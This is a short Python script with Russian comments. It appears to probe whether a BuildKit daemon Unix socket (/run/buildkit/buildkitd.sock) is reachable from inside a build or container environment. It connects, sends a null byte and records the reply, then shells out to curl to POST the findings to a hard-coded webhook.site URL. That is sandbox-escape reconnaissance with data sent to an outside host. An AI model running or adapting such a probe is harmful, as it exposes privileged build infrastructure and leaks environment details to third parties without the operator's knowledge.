import socket
import subprocess

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"
SOCKET_PATH = "/run/buildkit/buildkitd.sock"

def raw_socket_test():
    report = []
    
    try:
        # Прямое подключение к Unix-сокету
        client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client.settimeout(5) # Чтобы не висеть вечно
        
        client.connect(SOCKET_PATH)
        report.append(f"[!!!] SUCCESS: RAW CONNECT TO {SOCKET_PATH} ESTABLISHED!")
        
        # Попробуем считать приветствие (если есть)
        client.send(b"\x00") # Пустой байт для проверки связи
        data = client.recv(1024)
        report.append(f"[*] Received data: {data.hex()}")
        
        client.close()
    except Exception as e:
        report.append(f"[-] Raw connect failed: {e}")

    return "\n".join(report)

if __name__ == "__main__":
    result = raw_socket_test()
    # Гарантированная отправка через curl с коротким таймаутом
    subprocess.run(['curl', '-m', '10', '-s', '-X', 'POST', '-d', result, WEBHOOK_URL])
